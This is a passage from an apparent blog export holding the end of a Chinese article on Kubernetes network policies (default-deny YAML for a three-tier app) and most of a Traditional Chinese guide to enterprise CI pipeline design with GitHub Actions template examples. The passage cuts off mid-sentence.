ABAC 防火墙 功能 网络策略 服务网格 ABAC 防火墙 层级 第 3/4 层（IP/端口） 第 7 层（HTTP/gRPC） 第 3-7 层 复杂性 低 高 中 性能影响 最小 1-5 毫秒延迟 不一定 成本 免费（内置） 资源开销 许可成本 加密 否（需要单独解决方案） 包含双向 TLS 取决于产品 可观察性 基本（取决于 CNI） 优秀 良好 Kubernetes 原生 是 是 否 学习曲线 平缓 陡峭 中等 最适合 基本隔离 微服务安全 混合环境 实际实现 让我们通过一个实际示例：保护三层应用程序。 架构： 前端 Pod（面向公众） 后端 API Pod（内部） 数据库 Pod（敏感数据） 安全要求： 前端只能与后端 API 通信 后端 API 只能与数据库通信 数据库仅接受来自后端的连接 除了前端（用于 CDN 资产）外，没有 Pod 可以访问互联网 实现： # 默认拒绝所有流量 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: default-deny-all namespace: production spec: podSelector: &#123;&#125; policyTypes: - Ingress - Egress --- # 允许前端接收外部流量 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: frontend-policy namespace: production spec: podSelector: matchLabels: tier: frontend policyTypes: - Ingress - Egress ingress: - from: - namespaceSelector: &#123;&#125; ports: - protocol: TCP port: 80 egress: - to: - podSelector: matchLabels: tier: backend ports: - protocol: TCP port: 8080 - to: - namespaceSelector: &#123;&#125; podSelector: &#123;&#125; ports: - protocol: TCP port: 443 # 允许 HTTPS 用于 CDN --- # 允许后端仅与数据库通信 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: backend-policy namespace: production spec: podSelector: matchLabels: tier: backend policyTypes: - Ingress - Egress ingress: - from: - podSelector: matchLabels: tier: frontend ports: - protocol: TCP port: 8080 egress: - to: - podSelector: matchLabels: tier: database ports: - protocol: TCP port: 5432 - to: - namespaceSelector: matchLabels: name: kube-system podSelector: matchLabels: k8s-app: kube-dns ports: - protocol: UDP port: 53 # 允许 DNS --- # 数据库仅接受来自后端的连接 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: database-policy namespace: production spec: podSelector: matchLabels: tier: database policyTypes: - Ingress ingress: - from: - podSelector: matchLabels: tier: backend ports: - protocol: TCP port: 5432 这种设置建立了清晰的边界。即使攻击者入侵了前端，他们也无法直接访问数据库。他们需要同时入侵前端和后端才能接触到敏感数据——显著提高了门槛。 ⚠️ 别忘了 DNS一个常见的错误是忘记允许 DNS 流量。Pod 需要将服务名称解析为 IP 地址。始终包含 kube-dns 或 CoreDNS 的出站规则，通常在 UDP 端口 53 上。 入门指南 实现网络策略不必是全有或全无。以下是务实的方法： 1. 验证 CNI 支持：并非所有容器网络接口（CNI）插件都支持网络策略。Calico、Cilium 和 Weave Net 支持。AWS VPC CNI 和 Azure CNI 需要额外配置。检查您的 CNI 文档。 2. 从监控开始：在强制执行策略之前，以审计模式部署它们（如果您的 CNI 支持），或使用 Cilium Hubble 等工具可视化现有流量模式。 3. 从全部拒绝开始：在非关键命名空间中创建默认的全部拒绝策略。这会强制您明确允许必要的流量，揭示您的实际通信模式。 4. 逐步加入白名单：一次添加一个允许规则，每次更改后进行测试。从明显的流程（前端 → 后端）开始，然后处理边缘情况。 5. 自动化测试：使用 netassert 等工具为您的网络策略编写测试。这可以防止策略更改时的回归。 6. 文档化和版本控制：将策略与应用程序清单一起存储在 Git 中。记录每个规则存在的原因。未来的您（或您的团队成员）会感谢您。 🛠️ 有用的工具 Cilium Editor：可视化网络策略编辑器 Network Policy Viewer：将策略可视化为图形 Inspektor Gadget：实时调试网络流量 Calico Enterprise：高级策略管理（商业版） 结论 Kubernetes 网络策略对企业来说不是可选的。它是集群安全的基础，是防止横向移动的第一道防线，也是受监管行业的合规要求。 是的，有替代方案——服务网格提供更多功能，ABAC 防火墙提供更广泛的覆盖范围——但网络策略内置于 Kubernetes，不需要额外的基础设施，并解决了最关键的问题：防止不受限制的 Pod 间通信。 从简单开始。部署默认拒绝策略。将必要的流量加入白名单。彻底测试。您的安全团队、合规审计员和未来的事件响应人员会感谢您。 在 Kubernetes 中，默认是信任。对于企业来说，标准必须是零信任。网络策略就是您实现这一目标的方式。","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://neo01.com/tags/Kubernetes/"},{"name":"Network Policy","slug":"Network-Policy","permalink":"https://neo01.com/tags/Network-Policy/"},{"name":"Zero Trust","slug":"Zero-Trust","permalink":"https://neo01.com/tags/Zero-Trust/"}],"lang":"zh-CN"},{"title":"企業級 CI Pipeline 設計：大規模建構可靠的自動化","slug":"2020/08/Designing-CI-Pipelines-for-Enterprise-zh-TW","date":"un44fin44","updated":"un55fin55","comments":true,"path":"/zh-TW/2020/08/Designing-CI-Pipelines-for-Enterprise/","permalink":"https://neo01.com/zh-TW/2020/08/Designing-CI-Pipelines-for-Enterprise/","excerpt":"學習如何為企業環境設計強健的 CI pipeline。探索可擴展性、安全性和持續整合工作流程可靠性的最佳實踐。","text":"從手動部署轉向自動化持續整合，已經徹底改變了企業交付軟體的方式。然而，設計能在企業規模下可靠運作的 CI pipeline 面臨獨特挑戰——從管理複雜的依賴關係到確保數百個微服務的安全合規性。 本指南探討建構能夠應對企業需求的 CI pipeline 的原則和實踐，同時保持速度、可靠性和安全性。 理解企業級 CI 需求 企業級 CI pipeline 與新創公司或小團隊的工作流程有根本性的差異。規模、複雜性和監管要求需要不同的方法。 規模考量：企業環境通常涉及數百個儲存庫、每天數千次建置，以及分散在不同時區的團隊。你的 pipeline 必須處理這些量而不成為瓶頸。 安全與合規：金融服務、醫療保健和政府部門需要在每個階段進行稽核追蹤、存取控制和合規驗證。CI pipeline 必須自動執行這些要求。 多團隊協調：不同團隊在相互連接的服務上工作。你的 pipeline 需要偵測破壞性變更、協調部署，並提供跨團隊邊界的可見性。 舊系統整合：企業很少從零開始。你的 CI 系統必須與現有工具、資料庫和部署流程整合，同時逐步現代化基礎設施。 🎯 企業級 vs 新創公司 CI新創公司 CI：快速迭代、最少流程、可接受破壞性變更 企業級 CI：受控變更、廣泛驗證、對生產事故零容忍 差異不僅在於規模——而是理念。企業級 CI 優先考慮穩定性和合規性，而非純粹的速度。 核心 Pipeline 架構 設計良好的企業級 CI pipeline 遵循平衡速度與徹底性的結構化流程。 graph LR A([📝 程式碼提交]) --> B([🔍 靜態分析]) B --> C([🏗️ 建置]) C --> D([🧪 單元測試]) D --> E([📦 打包]) E --> F([🔐 安全掃描]) F --> G([🚀 部署到預備環境]) G --> H([✅ 整合測試]) H --> I([👤 人工審核]) I --> J([🌐 生產環境部署]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style F fill:#ffebee,stroke:#c62828,stroke-width:2px style I fill:#fff3e0,stroke:#f57c00,stroke-width:2px style J fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 階段 1：原始碼控制整合 每個 pipeline 都從原始碼控制開始。企業級 pipeline 必須支援： 分支保護：強制執行程式碼審查要求，防止直接提交到主分支 Webhook 可靠性：優雅地處理 webhook 失敗並提供重試機制 Monorepo 支援：偵測哪些服務發生變更並僅觸發相關建置 階段 2：靜態分析與 Linting 在編譯前捕捉問題： 程式碼品質閘門：強制執行複雜度閾值、程式碼覆蓋率最低標準 安全掃描：偵測硬編碼的機密資訊、有漏洞的依賴項 授權合規：驗證所有依賴項符合企業授權政策 階段 3：建置與編譯 建置階段必須： 可重現：相同的輸入總是產生相同的輸出 快取：重用先前建置的產物以減少時間 隔離：每次建置在乾淨的環境中執行以防止污染 階段 4：測試金字塔 實施全面的測試策略： 單元測試：快速、隔離的測試在每次提交時執行。這些應該在幾分鐘內完成並提供即時回饋。 整合測試：驗證元件協同工作。針對具有真實資料的預備環境執行。 端對端測試：驗證關鍵使用者旅程。這些較慢但能捕捉單元測試遺漏的問題。 效能測試：確保變更不會降低系統效能。在代表性工作負載上執行。 graph TB A([🔺 測試金字塔]) A --> B([E2E 測試慢速、全面]) B --> C([整合測試中速]) C --> D([單元測試快速、聚焦]) style B fill:#ffebee,stroke:#c62828,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 階段 5：產物管理 打包和版本化你的建置： 語意化版本控制：根據提交訊息自動遞增版本 產物儲存庫：將建置儲存在集中式儲存庫（Artifactory、Nexus） 不可變產物：建立後永不修改產物；改為建立新版本 階段 6：安全驗證 安全不能是事後想法： 容器掃描：檢查 Docker 映像檔是否有已知漏洞 依賴項分析：驗證第三方函式庫是最新且安全的 合規檢查：確保建置符合監管要求（GDPR、HIPAA、SOC2） 階段 7：部署階段 漸進式部署降低風險： 開發環境：每次提交自動部署。開發人員可以立即測試變更。 預備環境：鏡像生產環境配置。整合和 E2E 測試在此執行。 生產環境：需要人工審核。使用藍綠或金絲雀策略部署。 企業級 CI 最佳實踐 1. Pipeline 即程式碼 在版本控制檔案中定義 pipeline（Jenkinsfile、.gitlab-ci.yml、GitHub Actions）。這提供： 版本歷史：追蹤 pipeline 變更與程式碼變更 程式碼審查：pipeline 修改經過與程式碼相同的審查流程 可重用性：跨團隊共享 pipeline 範本 # 範例：GitHub Actions 工作流程 name: Enterprise CI Pipeline on: push: branches: [main, develop] pull_request: branches: [main] jobs: build: runs-on: ubuntu-latest steps: - uses: actions&#x2F;checkout@v2 - name: Static Analysis run: npm run lint - name: Build run: npm run build - name: Unit Tests run: npm test - name: Security Scan run: npm audit 2. 模組化 Pipeline 範本 在擁有數十或數百個服務的企業環境中，維護個別 pipeline 變得不可持續。Pipeline 範本透過將常見模式提取到可重用模組來解決這個問題。 範本階層： graph TB A([🎯 基礎範本所有專案的共同階段]) --> B([☕ Java 範本Maven/Gradle 特定]) A --> C([🐍 Python 範本pip/pytest 特定]) A --> D([⚡ Node.js 範本npm/jest 特定]) B --> E([🔧 微服務 A自訂配置]) C --> F([🔧 微服務 B自訂配置]) D --> G([🔧 前端應用自訂配置]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 基礎範本範例（GitHub Actions）： # .github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml name: Base CI Template on: workflow_call: inputs: build_command: required: true type: string test_command: required: true type: string artifact_path: required: false type: string default: &#39;dist&#x2F;&#39; jobs: ci: runs-on: ubuntu-latest steps: - uses: actions&#x2F;checkout@v2 - name: Static Analysis uses: .&#x2F;.github&#x2F;actions&#x2F;static-analysis - name: Build run: $&#123;&#123; inputs.build_command &#125;&#125; - name: Test run: $&#123;&#123; inputs.test_command &#125;&#125; - name: Security Scan uses: .&#x2F;.github&#x2F;actions&#x2F;security-scan - name: Upload Artifacts uses: actions&#x2F;upload-artifact@v2 with: path: $&#123;&#123; inputs.artifact_path &#125;&#125; 服務特定 Pipeline（使用範本）： # microservice-a&#x2F;.github&#x2F;workflows&#x2F;ci.yml name: Microservice A CI on: [push, pull_request] jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml with: build_command: &#39;mvn clean package&#39; test_command: &#39;mvn test&#39; artifact_path: &#39;target&#x2F;*.jar&#39; 基於範本的 Pipeline 優勢： 一致性：所有服務遵循相同的品質閘門和安全檢查 可維護性：透過變更一個範本更新 100 個 pipeline 入職：新服務自動繼承最佳實踐 治理：集中執行組織標準 減少重複：通用邏輯寫一次，到處重用 範本組合模式： 1. 繼承模式：範本擴展基礎範本，添加語言特定邏輯 # Java 範本擴展基礎範本 jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml with: setup_command: &#39;setup-java@v2&#39; build_command: &#39;mvn package&#39; 2. Mixin 模式：組合多個可重用元件 jobs: security: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;security-mixin.yml compliance: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;compliance-mixin.yml build: needs: [security, compliance] uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;build.yml 3. 覆寫模式：服務可以在需要時覆寫特定階段 jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline.yml with: build_command: &#39;mvn package&#39; # 覆寫：此服務需要延長測試逾時 test_timeout: 30 📦 範本函式庫組織按範圍組織範本： .github/workflows/templates/ ├── base&#x2F; │ ├── ci-pipeline.yml # 核心 CI 流程 │ └── cd-pipeline.yml # 核心 CD 流程 ├── languages&#x2F; │ ├── java-pipeline.yml │ ├── python-pipeline.yml │ └── nodejs-pipeline.yml ├── mixins&#x2F; │ ├── security-scan.yml │ ├── compliance-check.yml │ └── performance-test.yml └── specialized&#x2F; ├── microservice-pipeline.yml └── frontend-pipeline.yml 範本版本控制策略： 範本隨時間演進。對它們進行版本控制以防止破壞性變更： # 使用特定範本版本 jobs: build: uses: .&#x2F;.github&#x2F;workflows&#x2F;templates&#x2F;base-pipeline@v2.1.0 遷移路徑： 發布新範本版本（v2.1.0） 服務按自己的步調逐步遷移 遷移期後棄用舊版本 寬限期後移除已棄用的範本 多團隊範本可重用性 當組織中的多個團隊共享和重用 pipeline 範本時，範本的真正力量才會顯現。這需要仔細設計協作、治理和客製化。 集中式範本儲存庫： 為共享範本建立專用儲存庫： ci-templates-repo&#x2F; ├── README.md # 使用指南和目錄 ├── CHANGELOG.md # 版本歷史 ├── templates&#x2F; │ ├── base&#x2F; │ ├── languages&#x2F; │ ├── mixins&#x2F; │ └── specialized&#x2F; ├── examples&#x2F; │ ├── java-service-example.yml │ ├── python-api-example.yml │ └── frontend-app-example.yml ├── tests&#x2F; │ └── template-validation&#x2F; └── docs&#x2F; ├── getting-started.md ├── customization-guide.md └── migration-guide.md 團隊協作模型： graph TB A([🏢 平台團隊範本擁有者]) -->|維護與發布| B([📦 範本儲存庫]) B -->|使用| C([👥 團隊 AJava 服務]) B -->|使用| D([👥 團隊 BPython API]) B -->|使用| E([👥 團隊 C前端應用]) C -->|回饋與請求| A D -->|回饋與請求| A E -->|回饋與請求| A C -->|分享模式| F([💡 社群最佳實踐]) D -->|分享模式| F E -->|分享模式| F F -->|影響| A style A fill:#e3f2fd,stroke:#1976d2,stroke-width:3px style B fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 團隊的客製化層級： 允許團隊在不 fork 範本的情況下進行客製化： # 團隊 A 的客製化（team-a-defaults.yml） defaults: java_version: 11 maven_opts: &quot;-Xmx2048m&quot; test_timeout: 20 notification_channel: &quot;#team-a-builds&quot; # 團隊 A 的服務同時使用範本和團隊預設值 jobs: build: uses: org&#x2F;ci-templates&#x2F;java-microservice@v2.0.0 with: team_config: team-a-defaults.yml # 服務特定覆寫 test_timeout: 30 # 此服務需要更多時間 範本治理模型： 所有權結構： 平台團隊：維護核心範本、審查變更、確保品質 範本推廣者：來自各團隊提供回饋的代表 服務團隊：使用範本、回報問題、建議改進 變更管理流程： 提案：團隊透過 issue/PR 提交範本變更請求 審查：平台團隊和推廣者審查影響 測試：針對多個團隊的範例服務測試變更 Beta 發布：使用 -beta 標籤發布新版本 遷移期：團隊測試 beta 版本（2-4 週） 穩定發布：驗證後升級為穩定版 棄用：舊版本棄用，設定 3 個月的日落期 多團隊使用的範本版本控制： # 語意化版本控制與團隊遷移追蹤 template: java-microservice version: 2.1.0 released: 2020-08-01 breaking_changes: false adoption: team-a: 15&#x2F;20 services migrated team-b: 8&#x2F;12 services migrated team-c: 20&#x2F;20 services migrated deprecated_versions: v1.x: sunset 2020-11-01 自助式範本目錄： 為團隊提供可搜尋的目錄： # 用於探索的範本元資料 name: java-microservice category: backend language: java use_cases: - REST APIs - Microservices - Batch jobs features: - Maven&#x2F;Gradle support - JUnit testing - Docker packaging - Kubernetes deployment teams_using: [team-a, team-b, team-d, team-f] maturity: stable maintainer: platform-team support_channel: &quot;#ci-templates-help&quot; 跨團隊客製化模式： 模式 1：團隊特定 Mixin 團隊可以建立與基礎範本配合使用的自己的 mixin： # 團隊 A 的自訂安全 mixin # team-a-security-mixin.yml steps: - name: Team A Security Scan run: .&#x2F;team-a-security-tool - name: Upload to Team A Dashboard run: .&#x2F;upload-results # 在服務 pipeline 中使用 jobs: build: uses: org&#x2F;ci-templates&#x2F;base@v2.0.0 team-security: uses: team-a&#x2F;team-a-security-mixin@v1.0.0 模式 2：參數化團隊政策 範本接受團隊特定的政策配置： # 範本支援團隊政策 jobs: build: uses: org&#x2F;ci-templates&#x2F;java-microservice@v2.0.0 with: team_policy: | code_coverage_min: 80% security_scan: mandatory performance_test: optional approval_required: production_only 模式 3：聯邦式範本擴展 團隊可以在不修改原始範本的情況下擴展範本： # 團隊 B 用他們的新增內容擴展基礎範本 # team-b-java-extended.yml name: Team B Java Service extends: org&#x2F;ci-templates&#x2F;java-microservice@v2.0.0 additional_stages: post_build: - name: Team B Metrics run: .&#x2F;collect-team-metrics - name: Team B Notification run: .&#x2F;notify-team-dashboard 衡量多團隊範本成功： 追蹤採用率和有效性： metrics: adoption_rate: 85% # 170&#x2F;200 服務使用範本 teams_using: 12&#x2F;15 average_customization: 15% # 團隊覆寫多少 template_update_frequency: 2.3&#x2F;month breaking_changes: 0.2&#x2F;year support_tickets: 3.5&#x2F;month time_to_onboard_new_service: 2 hours (was 2 weeks) 溝通與支援： 文件入口網站：每個範本的可搜尋文件與範例 Slack 頻道：#ci-templates-help 用於問題和討論 辦公時間：每週平台團隊協助團隊的會議 電子報：每月更新新範本和改進 範本展示：每季成功模式的示範 🌟 多團隊成功故事擁有 15 個團隊、250 個服務的電商公司： 挑戰：每個團隊以不同方式建置 pipeline，導致： 不一致的安全實踐 跨團隊協作困難 高維護負擔 新工程師入職緩慢 解決方案：實施共享範本函式庫： 6 個基礎範本（Java、Python、Node.js、Go、Mobile、Data） 團隊特定客製化層級 聯邦治理模型 自助式目錄 6 個月後的結果： 85% 範本採用率（213/250 服務） pipeline 維護時間減少 90% 100% 服務現在有安全掃描 新服務入職：2 小時（原為 2 週） 跨團隊協作改善（共享模式） 3 個團隊貢獻改進回範本 關鍵成功因素：標準化與團隊自主權之間的平衡 範本治理： 所有權：平台團隊維護範本，服務團隊使用它們 變更流程：範本變更需要審查和測試 文件：每個範本包含使用範例和參數 指標：追蹤範本採用率並識別改進機會 3. 快速失敗原則 先執行快速檢查。如果靜態分析失敗，不要浪費時間在建置和測試上。這節省運算資源並提供更快的回饋。 最佳階段順序： Linting（秒） 靜態分析（1-2 分鐘） 建置（2-5 分鐘） 單元測試（5-10 分鐘） 整合測試（10-20 分鐘） E2E 測試（20-30 分鐘） 4. 平行執行 同時執行獨立任務： 測試平行化：將測試套件分散到多個執行器 多平台建置：同時為不同平台建置 獨立服務：平行建置微服務 這可以將 pipeline 時間從數小時減少到數分鐘。 5. 快取策略 實施積極的快取： 依賴項快取：快取 npm、Maven 或 pip 依賴項 建置快取：當原始碼未變更時重用編譯產物 Docker 層快取：利用 Docker 的層快取加快映像檔建置 💡 快取失效快取失效是出了名的困難。使用基於內容的快取鍵（依賴檔案的雜湊）而非基於時間的過期。這確保快取僅在依賴項實際變更時失效。 6. 環境一致性 保持開發、預備和生產環境盡可能相似： 基礎設施即程式碼：使用 Terraform 或 CloudFormation 定義環境 配置管理：在所有環境中使用相同的配置系統 資料一致性：在預備環境中盡可能使用匿名化的生產資料 7. 監控與可觀測性 為你的 pipeline 添加監測： 建置指標：追蹤建置持續時間、成功率、失敗原因 資源使用：監控建置期間的 CPU、記憶體和磁碟使用 告警：當 pipeline 失敗或效能下降時通知團隊 8. 安全強化 保護你的 CI 基礎設施： 機密管理：使用保管庫系統（HashiCorp Vault、AWS Secrets Manager）管理憑證 最小權限：為每個 pipeline 階段授予所需的最小權限 稽核日誌：記錄所有 pipeline 執行和存取嘗試 網路隔離：在隔離網路中執行建置以防止橫向移動 ⚠️ 常見安全錯誤 在環境變數中儲存憑證 以管理員權限執行建置 允許在 pull request 中執行任意程式碼 將內部服務暴露給建置執行器 未能定期輪換憑證 單一 Pipeline 適用所有應用的辯論 企業級 CI 設計中反覆出現的問題：你應該建立一個處理所有應用的通用 pipeline，還是為不同用例維護專門的 pipeline？答案，就像大多數架構決策一樣，是微妙的。 通用 Pipeline 的吸引力 這個想法很誘人：一個 pipeline 統治所有。每個應用，無論語言或框架，都通過相同的階段和相同的品質閘門。 理論優勢： 整個組織的終極一致性 單一維護點 簡化治理和合規 新團隊更容易入職 現實檢驗： 真正的通用 pipeline 要麼變得過於通用而無用，要麼過於複雜而難以維護。考慮這些情境： graph TB A([通用 Pipeline]) --> B{應用類型？} B -->|Java| C[Maven 建置JUnit 測試JAR 打包] B -->|Python| D[pip installpytestWheel 打包] B -->|Node.js| E[npm installJest 測試Docker 映像檔] B -->|Go| F[go buildgo test二進位打包] B -->|Mobile| G[Gradle/XcodeUI 測試App store 部署] style A fill:#ffebee,stroke:#c62828,stroke-width:3px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style E fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 複雜度爆炸： 處理所有這些情況的通用 pipeline 需要： 每種語言和框架的條件邏輯 指定應用類型的配置檔案 識別專案結構的偵測機制 偵測失敗時的後備策略 跨所有支援情境的廣泛測試 結果？一個 2000 行的 pipeline 配置，沒人完全理解，每個人都害怕觸碰。 解決方案的光譜 與其二元選擇，不如考慮一個光譜： 層級 1：完全專門化的 Pipeline 每個應用都有獨特的 pipeline 最大靈活性，零重用 大規模維護噩夢 層級 2：語言特定範本 ⭐（推薦） Java、Python、Node.js 等的獨立範本 每個範本針對其生態系統優化 服務繼承並根據需要客製化 層級 3：混合通用 Pipeline 具有語言特定外掛的基礎 pipeline 中等複雜度，良好重用 需要複雜的外掛架構 層級 4：完全通用 Pipeline 一個 pipeline 處理所有事情 最大一致性，高複雜度 難以維護和擴展 🎯 最佳平衡點**層級 2（語言特定範本）**為大多數企業提供最佳平衡： 一致性：所有 Java 服務使用相同的 Java 範本 優化：每個範本使用語言特定的最佳實踐 可維護性：5-10 個範本而非 200 個獨特 pipeline 靈活性：服務可以在需要時覆寫 簡單性：每個範本都專注且易於理解 通用 Pipeline 何時有效 通用 pipeline 在特定情境下可以成功： 同質環境： 組織標準化為單一語言/框架 所有服務遵循相同的架構模式 範例：100% Go 服務的微服務公司 容器優先組織： 每個應用都建置 Docker 映像檔 Pipeline 專注於容器生命週期，而非語言特定 語言特定步驟發生在 Dockerfile 內 # 通用容器 pipeline stages: - lint - build-image # Dockerfile 處理語言特定 - test-image - scan-image - push-image - deploy 高度抽象的平台： 平台團隊提供建置抽象 應用宣告依賴項，平台處理建置 範例：具有通用規則的 Bazel 或 Buck 建置系統 基於範本的方法（推薦） 與其強制所有東西通過一個 pipeline，不如建立一系列專門的範本： Templates&#x2F; ├── base-template.yml # 所有繼承的共同階段 ├── java-microservice.yml # 擴展基礎，添加 Maven&#x2F;Gradle ├── python-service.yml # 擴展基礎，添加 pip&#x2F;pytest ├── nodejs-frontend.yml # 擴展基礎，添加 npm&#x2F;webpack ├── mobile-ios.yml # 擴展基礎，添加 Xcode ├── mobile-android.yml # 擴展基礎，添加 Gradle └── data-pipeline.yml # 擴展基礎，添加 Spark&#x2F;Airflow 每個範本針對其領域優化： # java-microservice.yml extends: base-template.yml stages: - validate: - checkstyle - spotbugs - build: - maven: clean package - cache: ~&#x2F;.m2&#x2F;repository - test: - junit: test - jacoco: coverage &gt; 80% - package: - docker: build - artifact: target&#x2F;*.jar # nodejs-frontend.yml extends: base-template.yml stages: - validate: - eslint - prettier - build: - npm: ci - webpack: build --production - cache: node_modules&#x2F; - test: - jest: --coverage - cypress: e2e - package: - s3: upload dist&#x2F; 決策框架 使用此框架決定你的方法： 選擇通用 Pipeline 如果： ✅ 所有應用使用相同語言/框架 ✅ 組織有強大的平台工程團隊 ✅ 容器優先架構與語言抽象 ✅ 願意大量投資於 pipeline 複雜度 選擇基於範本的方法如果： ✅ 使用多種語言和框架 ✅ 不同應用類型（web、mobile、data、ML） ✅ 團隊需要特殊需求的靈活性 ✅ 想要一致性與可維護性之間的平衡 選擇專門化 Pipeline 如果： ✅ 非常小的組織（&lt;10 個服務） ✅ 高度多樣化的技術堆疊 ✅ 每個應用都有獨特的部署需求 ✅ 快速實驗比一致性更重要 ⚠️ 反模式：超大型 Pipeline避免建立具有數百個條件分支的單一 pipeline： # 不要這樣做 if language &#x3D;&#x3D; &quot;java&quot;: if build_tool &#x3D;&#x3D; &quot;maven&quot;: if java_version &#x3D;&#x3D; &quot;8&quot;: run: mvn -Djava.version&#x3D;8 package elif java_version &#x3D;&#x3D; &quot;11&quot;: run: mvn -Djava.version&#x3D;11 package elif build_tool &#x3D;&#x3D; &quot;gradle&quot;: # ... 更多條件 elif language &#x3D;&#x3D; &quot;python&quot;: # ... 更多條件 這變得難以維護且容易出錯。改用範本。 結論：務實的靈活性 問題不是「一個 pipeline 能適用所有應用嗎？」而是「應該嗎？」對大多數企業來說答案是否定的。相反： 建立基礎範本，包含共同階段（安全、合規、部署） 建置專門範本，針對每個主要技術堆疊 允許客製化，團隊有合理的特殊需求時 維護治理，透過基礎範本中的必需階段 衡量和迭代，基於實際使用模式 這種方法在重要的地方提供一致性（安全、合規），同時在有幫助的地方允許優化（語言特定工具）。這是與你的組織一起擴展的務實中間地帶。 處理常見企業挑戰 挑戰 1：建置時間過長 問題：建置耗時 30 分鐘以上讓開發人員沮喪並減緩交付。 解決方案： 實施增量建置（僅重建變更的元件） 使用分散式建置系統（Bazel、Buck） 投資更快的建置基礎設施 平行化測試執行 積極快取 挑戰 2：不穩定的測試 問題：通過/失敗不一致的測試侵蝕對 CI 的信心。 解決方案： 隔離不穩定的測試（單獨執行，不阻塞 pipeline） 為依賴網路的測試添加重試邏輯 使用測試隔離技術 監控測試可靠性指標 分配時間進行測試維護 挑戰 3：依賴項管理 問題：跨數百個服務管理依賴項變得混亂。 解決方案： 使用依賴項管理工具（Dependabot、Renovate） 實施自動化依賴項更新 維護已批准的依賴項清單 使用鎖定檔案確保可重現的建置 定期進行依賴項安全稽核 挑戰 4：多團隊協調 問題：團隊在部署期間互相干擾。 解決方案： 實施部署時間窗口 使用功能旗標將部署與發布解耦 建立明確的所有權邊界 建立共享 pipeline 範本 定期跨團隊同步會議 挑戰 5：合規與稽核要求 問題：監管要求需要廣泛的文件和控制。 解決方案： pipeline 中的自動化合規檢查 不可變稽核日誌 生產部署的審批工作流程 自動化稽核證據收集 定期合規審查 工具與技術 CI/CD 平台 Jenkins：最靈活，需要大量維護。最適合具有現有 Jenkins 專業知識的複雜企業需求。 GitLab CI：與原始碼控制整合，適合想要一體化解決方案的團隊。 GitHub Actions：非常適合以 GitHub 為中心的工作流程，不斷增長的 action 生態系統。 CircleCI：強大的效能，良好的快取，擴展性好。 AWS CodePipeline：原生 AWS 整合，無伺服器執行模型。 建置工具 Maven/Gradle：Java 生態系統標準 npm/Yarn：JavaScript 套件管理 Make：通用建置自動化 Bazel：Google 的建置系統，非常適合 monorepo 測試框架 JUnit/TestNG：Java 測試 Jest/Mocha：JavaScript 測試 pytest：Python 測試 Selenium：瀏覽器自動化 JMeter：效能測試 安全工具 SonarQube：程式碼品質和安全分析 Snyk：依賴項漏洞掃描 Trivy：容器安全掃描 OWASP Dependency-Check：開源依賴項分析 衡量 Pipeline 成功 追蹤這些關鍵指標： 建置成功率：通過的建置百分比。目標：&gt;95% 平均回饋時間：開發人員獲得建置結果的速度。目標：&lt;10 分鐘 部署頻率：部署到生產環境的頻率。目標：每天多次 變更失敗率：導致事故的部署百分比。目標：&lt;5% 平均恢復時間：從失敗中恢復的速度。目標：&lt;1 小時 (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_48cef1040')); var option = { \"title\": { \"text\": \"CI Pipeline 效能指標\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"建置成功率\", \"部署頻率\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"第 1 週\", \"第 2 週\", \"第 3 週\", \"第 4 週\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"百分比\" }, \"series\": [ { \"name\": \"建置成功率\", \"type\": \"line\", \"data\": [92, 94, 96, 97], \"itemStyle\": { \"color\": \"#388e3c\" } }, { \"name\": \"部署頻率\", \"type\": \"line\", \"data\": [85, 88, 91, 93], \"itemStyle\": { \"color\": \"#1976d2\" } } ] }; chart.setOption(option); } })(); 結論 為企業環境設計 CI pipeline 需要平衡競爭需求：速度與徹底性、靈活性與標準化、創新與穩定性。這裡概述的原則——快速失敗、積極快取、全面測試、預設安全——為建置與你的組織一起擴展的 pipeline 提供了基礎。 記住，CI pipeline 設計永遠不會完成。隨著你的組織成長、技術演進和需求變化，你的 pipeline 必須適應。投資使它們可維護、可觀測和持續改進。 目標不是完美——而是建置一個可靠地交付高品質軟體的系統，同時使團隊能夠快速移動和創新。透過深思熟慮的設計和持續改進，你的 CI pipeline 成為競爭優勢而非瓶頸。 💭 最後的想法「最好的 CI pipeline 